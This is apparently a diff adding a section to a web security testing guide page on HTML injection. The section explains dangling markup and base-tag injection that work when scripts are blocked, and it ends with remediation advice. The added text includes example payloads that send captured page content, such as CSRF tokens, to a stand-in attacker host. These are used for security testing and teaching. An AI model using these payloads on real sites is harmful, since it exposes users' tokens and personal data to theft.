@@ -39,6 +39,7 @@ This input will add an image tag to the page that will execute arbitrary JavaScr
 ## Test Objectives
 
 - Identify HTML injection points and assess the severity of the injected content.
+- Assess what injected markup can do when script execution is blocked, for example by a Content Security Policy.
 
 ## How to Test
 
@@ -63,3 +64,36 @@ $(window).bind("hashchange",setMessage)
 ```
 
 It is possible to inject HTML code.
+
+### Injection Without Script Execution
+
+An injection point is still worth reporting when scripts can't run, for example because the application filters event handlers or a [Content Security Policy](../02-Configuration_and_Deployment_Management/12-Content_Security_Policy.md) blocks inline script. Plain markup can still leak data or redirect the user.
+
+#### Dangling Markup
+
+If the injection lands before sensitive content in the same page, such as a CSRF token or personal data, an unclosed attribute can capture that content and send it to another site. Inject a tag whose URL attribute is opened but not closed:
+
+```html
+<img src='https://attacker.example/collect?
+```
+
+The browser reads everything up to the next `'` in the page as part of the URL, including the markup and values that follow the injection point, and requests it from the attacker's server. Check the attacker server's logs for the captured content.
+
+Chromium-based browsers block resource URLs that contain both a raw newline and `<`, which stops the simplest form of this when the captured text spans several lines. Browsers handle other elements differently, so try several and test in more than one browser:
+
+- `<a href='https://attacker.example/?` or `<form action='https://attacker.example/?`, which need the user to click or submit;
+- `<meta http-equiv="refresh" content='0;url=https://attacker.example/?`, which navigates without a click;
+- an injected `<form>` with no closing tag, placed before a legitimate form, so the legitimate form's fields and token are submitted to the attacker's `action`.
+
+#### Base Tag Injection
+
+An injected `<base href="https://attacker.example/">` changes how every relative URL after it is resolved. Relative script sources, form actions and links then point to the attacker's server. With a nonce-based CSP, an existing script tag that carries a valid nonce and a relative `src` loads from the attacker's server and runs, which turns markup injection into script execution. Check whether the page loads scripts or submits forms with relative URLs after the injection point, and whether the CSP sets `base-uri`.
+
+## Remediation
+
+Encode user input for the HTML context it is written into, so that it can't open new tags or attributes. Set `base-uri 'none'` or `'self'` and a restrictive `form-action` in the Content Security Policy, and keep sensitive values such as CSRF tokens out of pages that also reflect user input where possible.
+
+## References
+
+- [PortSwigger: Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
+- [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
